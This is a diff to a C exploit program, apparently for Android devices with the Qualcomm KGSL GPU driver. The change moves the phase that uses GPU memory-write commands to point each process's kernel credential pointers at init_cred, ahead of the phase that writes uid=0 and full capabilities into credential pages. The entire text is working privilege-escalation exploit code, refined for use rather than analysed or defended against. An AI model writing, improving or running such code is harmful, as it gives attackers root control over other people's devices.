@@ -622,8 +622,50 @@ int main(int argc, char **argv) {
         }
     }
 
+    // ===== Phase 8e: Overwrite task_struct->cred and real_cred to init_cred (BEFORE Phase 8b) =====
+    if (n_task > 0 && init_cred_addr != 0) {
+        printf("[*] Phase 8e: Overwriting task_struct->cred and real_cred to init_cred\n");
+        for (int p = 0; p < n_task; p++) {
+            uint64_t task_va = task_pages[p];
+            uint64_t cred_off = task_va + CRED_OFF;
+            uint64_t real_cred_off = task_va + REAL_CRED_OFF;
+            printf("  task[%d] va=0x%lx, cred at 0x%lx, real_cred at 0x%lx -> 0x%lx\n",
+                p, (unsigned long)task_va, (unsigned long)cred_off,
+                (unsigned long)real_cred_off, (unsigned long)init_cred_addr);
+
+            uint32_t *cmd = (uint32_t *)ib_m;
+            int dw = 0;
+            memset(ib_m, 0, 0x10000);
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+
+            uint32_t zl, zh;
+            split64(cred_off, &zl, &zh);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
+            cmd[dw++] = zl; cmd[dw++] = zh;
+            split64(init_cred_addr, &zl, &zh);
+            cmd[dw++] = zl; cmd[dw++] = zh;
+
+            split64(real_cred_off, &zl, &zh);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
+            cmd[dw++] = zl; cmd[dw++] = zh;
+            split64(init_cred_addr, &zl, &zh);
+            cmd[dw++] = zl; cmd[dw++] = zh;
+
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int ts;
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
+                wait_timestamp(kgsl_fd, ctx_id, ts);
+                __sync_synchronize();
+                flush_dc_civac_range((void*)task_va, 0x1000);
+            }
+        }
+        printf("  Phase 8e: %d task_structs updated\n", n_task);
+    }
+
+    // ===== Phase 8b: Original cred content modification (now harmless, as cred pointer is already init_cred) =====
     if (n_cred > 0) {
-        printf("[*] Phase 8b: Writing uid=0 + full caps to %d cred pages\n", n_cred);
+        printf("[*] Phase 8b: Writing uid=0 + full caps to %d cred pages (old cred structures, not used)\n", n_cred);
         int n_ok = 0;
         for (int p = 0; p < n_cred && p < 32; p++) {
             uint64_t cbase = cred_pages[p] + cred_offs[p];
@@ -695,7 +737,7 @@ int main(int argc, char **argv) {
         printf("  Phase 8b: %d creds updated\n", n_ok);
 
         if (n_cred > 0) {
-            printf("[*] Phase 8c: Dumping cred page AFTER write\n");
+            printf("[*] Phase 8c: Dumping cred page AFTER write (old cred)\n");
             memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
             uint32_t *ccmd = (uint32_t *)ib_m;
             int cdw = 0;
@@ -724,46 +766,6 @@ int main(int argc, char **argv) {
                     cd[31], cd[30], cd[4]);
             }
         }
-    }
-
-    if (n_task > 0 && init_cred_addr != 0) {
-        printf("[*] Phase 8e: Overwriting task_struct->cred and real_cred to init_cred\n");
-        for (int p = 0; p < n_task; p++) {
-            uint64_t task_va = task_pages[p];
-            uint64_t cred_off = task_va + CRED_OFF;
-            uint64_t real_cred_off = task_va + REAL_CRED_OFF;
-            printf("  task[%d] va=0x%lx, cred at 0x%lx, real_cred at 0x%lx -> 0x%lx\n",
-                p, (unsigned long)task_va, (unsigned long)cred_off,
-                (unsigned long)real_cred_off, (unsigned long)init_cred_addr);
-
-            uint32_t *cmd = (uint32_t *)ib_m;
-            int dw = 0;
-            memset(ib_m, 0, 0x10000);
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-
-            uint32_t zl, zh;
-            split64(cred_off, &zl, &zh);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-            cmd[dw++] = zl; cmd[dw++] = zh;
-            split64(init_cred_addr, &zl, &zh);
-            cmd[dw++] = zl; cmd[dw++] = zh;
-
-            split64(real_cred_off, &zl, &zh);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-            cmd[dw++] = zl; cmd[dw++] = zh;
-            split64(init_cred_addr, &zl, &zh);
-            cmd[dw++] = zl; cmd[dw++] = zh;
-
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-            __sync_synchronize();
-            unsigned int ts;
-            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
-                wait_timestamp(kgsl_fd, ctx_id, ts);
-                __sync_synchronize();
-                flush_dc_civac_range((void*)task_va, 0x1000);
-            }
-        }
-        printf("  Phase 8e: %d task_structs updated\n", n_task);
     }
 
     printf("[*] Phase 8d: Cache eviction\n"); fflush(stdout);
